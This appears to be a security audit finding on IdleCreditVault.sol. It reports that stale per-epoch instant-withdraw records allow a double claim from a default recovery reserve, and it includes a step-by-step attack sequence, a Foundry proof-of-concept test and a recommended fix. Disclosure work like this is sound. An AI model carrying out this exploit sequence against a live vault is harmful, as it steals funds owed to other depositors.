### Title
Stale per-epoch instant-withdraw receipt is never cleared on funded claims, letting a user double-claim from the default recovery reserve - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`claimInstantWithdrawRequest` clears only the aggregate `instantWithdrawsRequests[_user]` but leaves `instantWithdrawsRequestsByEpoch[_user][epoch]` and the global `instantWithdrawClaimsByEpoch[epoch]` populated. Because `epochNumber` only advances at `stopEpoch`, an attacker can, inside a single epoch, (1) make an instant-withdraw request, (2) get it funded and claim it at par, (3) make a second instant request in the same epoch, then — if the borrower defaults before that second request is funded — have `finalizeDefault` count the already-paid first receipt again in `defaultPendingClaimBasis`, and later withdraw `A + B` from the recovery reserve while only ever holding `B` (plus a normal-request receipt) of backing.

### Finding Description
The funded-claim path `claimInstantWithdrawRequest` zeroes `instantWithdrawsRequests[_user]` and burns the receipt, but never touches `instantWithdrawsRequestsByEpoch[_user][epochNumber]` or `instantWithdrawClaimsByEpoch[epochNumber]` [1](#0-0) . Those per-epoch slots are only cleared in the defaulted-epoch path `_claimDefaultedInstantWithdrawRequest` [2](#0-1) .

This is the stale-session analog: the per-epoch "credential" remains valid after it has already been redeemed. Two downstream consumers trust it:

1. `defaultPendingClaimBasis` adds `instantWithdrawClaimsByEpoch[epochNumber]` to the haircut basis whenever `pendingInstantWithdraws != 0` at finalization [3](#0-2) . The already-claimed amount `A` is still in that global counter, so the finalized basis is inflated by `A`, diluting `defaultRecoveryPrice` for every other claimant.
2. `_claimDefaultedInstantWithdrawRequest` pays `(instantWithdrawsRequestsByEpoch[_user][defaultEpoch] * defaultRecoveryPrice) / RECOVERY_FULL`, i.e. `A + B`, not `B` [4](#0-3) .

The `_burn(_user, claimBasis)` check would normally stop this because the first receipt was already burned, but receipt tokens are fungible: a normal `requestWithdraw` (or the second instant request plus any additional normal request) in the same epoch mints fresh receipt tokens to the user [5](#0-4) , so a balance ≥ `A + B` is attainable and the burn succeeds.

Attack sequence (all in epoch `E`, attacker = ordinary KYC'd tranche holder):

1. APR drops so `requestWithdraw` routes to `requestInstantWithdraw` [6](#0-5) . Attacker requests `A`. Epoch entries now hold `A`.
2. `startEpoch`/`getInstantWithdrawFunds` funds `A` (`pendingInstantWithdraws` → 0, `allowInstantWithdraw = true`) [7](#0-6) .
3. Attacker calls `claimInstantWithdrawRequest`, receives `A` underlying. Aggregate cleared; per-epoch entries still `A`.
4. Attacker requests a second instant withdraw `B` (and, to cover the burn, a normal `requestWithdraw` of size ≥ `A`, which is legitimate and separately claimable). Epoch entries now hold `A + B`; `pendingInstantWithdraws = B`.
5. Before `B` is funded, the borrower honestly fails to repay (`getInstantWithdrawFunds` catch or `stopEpoch` shortfall) → `_handleBorrowerDefault`, then `finalizeDefault` [8](#0-7) . `defaultPendingClaimBasis` includes the stale `A`.
6. Attacker calls `claimInstantWithdrawRequest`; `_claimDefaultedInstantWithdrawRequest` pays `(A + B) * defaultRecoveryPrice / RECOVERY_FULL` out of `defaultRecoveryReserve` [9](#0-8) . Their normal receipt remains separately claimable via `claimWithdrawRequest`.

### Impact Explanation
Direct theft of `A * defaultRecoveryPrice` from the shared recovery reserve, plus dilution of every other defaulted-epoch claimant because the basis used to compute `defaultRecoveryPrice` is overstated by `A`. Since the reserve is fixed at finalization, later honest claimants revert on `defaultRecoveryReserve -= amount` underflow — a permanent loss shifted onto them. The attacker controls `A` up to their full tranche position, so the theft is bounded only by their deposit size.

### Likelihood Explanation
Requires a same-epoch borrower default after at least one funded instant claim — the exact precondition the codebase already handles (test `testFinalizeDefaultClaimsFundedAndDefaultedInstantRedeemsInOneCall` exercises funded + unfunded instant receipts in a default, but only across different epochs for the same user) [10](#0-9) . Within-epoch funded-then-unfunded instant requests for the same user are unguarded: nothing in `requestInstantWithdraw` prevents a second request after claiming [11](#0-10) . No privileged action is needed beyond the honest manager/borrower default sequence.

### Recommendation
In `claimInstantWithdrawRequest`, after determining `amount`, decrement the per-epoch accounting the same way the defaulted path does — iterate or track the user's open instant-request epochs and clear `instantWithdrawsRequestsByEpoch[_user][epoch]` and `instantWithdrawClaimsByEpoch[epoch]` for the funded portion, so `defaultPendingClaimBasis` and `_claimDefaultedInstantWithdrawRequest` only ever see unfunded receipts. Alternatively, store the funded/unfunded split per user per epoch at `collectInstantWithdrawFunds` time and subtract the funded share when computing the default claim basis.

### Proof of Concept
```solidity
// Foundry fork test, same harness style as test/foundry/IdleCreditVault.t.sol
function testStaleInstantReceiptDoubleClaimsRecovery() external {
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    address attacker = makeAddr('attacker');
    uint256 amount = 20_000 * ONE_SCALE;
    uint256 recoveryRatio = 7e17;

    _depositWithUser(attacker, amount, true);
    idleCDO.depositAA(amount); // other LP liquidity

    // epoch 0 ends with lower APR so instant-withdraw mode triggers
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());

    // step 1: first instant request A in epoch 1
    uint256 trancheBal = IERC20Detailed(address(AAtranche)).balanceOf(attacker);
    vm.prank(attacker);
    uint256 A = cdoEpoch.requestWithdraw(trancheBal / 4, address(AAtranche));

    // step 2: epoch 1 starts, instant request fully funded and claimable
    _startEpochAndCheckPrices(1);
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    _getInstantFunds();

    // step 3: attacker claims A at par
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();

    // BUG PRECONDITION: per-epoch entries still hold A
    uint256 epoch = creditVault.epochNumber();
    assertEq(creditVault.instantWithdrawsRequestsByEpoch(attacker, epoch), A, 'stale receipt');
    assertEq(creditVault.instantWithdrawClaimsByEpoch(epoch), A, 'stale global basis');

    // step 4: second instant request B + a normal request to re-acquire receipt tokens
    vm.prank(attacker);
    uint256 B = cdoEpoch.requestWithdraw(trancheBal / 4, address(AAtranche)); // instant
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(trancheBal / 2, address(AAtranche));           // normal -> mints receipts >= A+B

    // step 5: borrower defaults with B still pending
    vm.warp(cdoEpoch.epochEndDate() + 1);
    _toggleEpoch(false, initialProvidedApr / 2, _expectedFundsEndEpoch() - B);
    assertTrue(cdoEpoch.defaulted());

    // basis is inflated by A (already paid)
    uint256 basis = creditVault.defaultPendingClaimBasis();
    assertGt(basis, B, 'stale A counted in default basis');

    uint256 recovered = basis * recoveryRatio / ONE_TRANCHE;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // step 6: attacker claims (A + B) * recoveryPrice from the reserve
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    assertApproxEqAbs(
        underlying.balanceOf(attacker) - balPre,
        (A + B) * creditVault.defaultRecoveryPrice() / creditVault.RECOVERY_FULL(),
        5,
        'double claim of stale instant receipt'
    );
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-275)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L356-375)
```text
  function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L380-393)
```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L644-649)
```text
  function defaultPendingClaimBasis() public view returns (uint256 basis) {
    basis = pendingWithdraws;
    if (pendingInstantWithdraws != 0) {
      basis += instantWithdrawClaimsByEpoch[epochNumber];
    }
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L842-856)
```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L912-917)
```text
  function _transferDefaultRecovery(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    // Every defaulted or post-default claim consumes the isolated recovery reserve.
    defaultRecoveryReserve -= _amount;
    underlyingToken.safeTransfer(_user, _amount);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L279-292)
```text
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
```

**File:** contracts/IdleCDOEpochVariant.sol (L558-598)
```text
  function getInstantWithdrawFunds() external {
    _checkOnlyOwnerOrManager();
    // Check that programmable mode is disabled, the epoch is running and the deadline passed.
    _checkNotAllowed(isProgrammableBorrower || !isEpochRunning || block.timestamp < instantWithdrawDeadline);

    IdleCreditVault _strategy = IdleCreditVault(strategy);
    uint256 _instantWithdraws = _pendingInstant();
    // transfer funds for instant withdraw to this contract
    try this.getFundsFromBorrower(_instantWithdraws) {
      // transfer funds to IdleCreditVault and decrease pendingInstantWithdraws
      _strategy.collectInstantWithdrawFunds(_instantWithdraws);
      // allow instant withdraws
      allowInstantWithdraw = true;
    } catch {
      _handleBorrowerDefault(_instantWithdraws);
    }
  }

  /// @notice Handle borrower default
  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();
    }

    // deposits should be already prevented
    if (!paused()) {
      _pause();
    }

    // stop the current epoch
    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    emit BorrowerDefault(funds);
```

**File:** contracts/IdleCDOEpochVariant.sol (L761-769)
```text
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
```

**File:** test/foundry/IdleCreditVault.t.sol (L4485-4551)
```text
  function testFinalizeDefaultClaimsFundedAndDefaultedInstantRedeemsInOneCall() external {
    uint256 instantDelay = cdoEpoch.instantWithdrawDelay();
    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(instantDelay, 1000, false);

    address instantUser = makeAddr('mixed-default-instant-user');
    uint256 amount = 20_000 * ONE_SCALE;
    uint256 recoveryRatio = 7e17;
    uint256[3] memory claimData;

    _depositWithUser(instantUser, amount, true);
    idleCDO.depositAA(amount);

    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());

    uint256 userTrancheBal = IERC20Detailed(address(AAtranche)).balanceOf(instantUser);
    vm.prank(instantUser);
    claimData[0] = cdoEpoch.requestWithdraw(userTrancheBal / 2, address(AAtranche));

    _startEpochAndCheckPrices(1);
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    _getInstantFunds();

    _stopEpochAndCheckPrices(1, initialProvidedApr / 4, _expectedFundsEndEpoch());

    vm.prank(instantUser);
    claimData[1] = cdoEpoch.requestWithdraw(0, address(AAtranche));

    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    _startEpochAndCheckPrices(2);
    uint256 pendingInstant = creditVault.pendingInstantWithdraws();
    assertGt(pendingInstant, 0, 'default instant request should remain unfunded');
    claimData[2] = claimData[1] - pendingInstant;

    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds();
    _checkDefault();
    assertEq(cdoEpoch.allowInstantWithdraw(), false, 'mixed funded and unfunded instant claims should stay frozen');

    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    vm.prank(instantUser);
    cdoEpoch.claimInstantWithdrawRequest();

    uint256 recovered =
      ((cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest() - cdoEpoch.pendingWithdrawFees() + creditVault.defaultPendingClaimBasis())
          * recoveryRatio
          / ONE_TRANCHE) - claimData[2];
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(instantUser);
    vm.prank(instantUser);
    cdoEpoch.claimInstantWithdrawRequest();
    assertApproxEqAbs(
      IERC20Detailed(defaultUnderlying).balanceOf(instantUser) - balPre,
      claimData[0] + (claimData[1] * recoveryRatio / ONE_TRANCHE),
      5,
      'funded and defaulted instant receipts should be claimed together'
    );
    assertEq(IERC20Detailed(strategyToken).balanceOf(instantUser), 0, 'user has no strategy receipt left');
    assertEq(creditVault.instantWithdrawsRequests(instantUser), 0, 'instant requests should be fully cleared');
  }
```
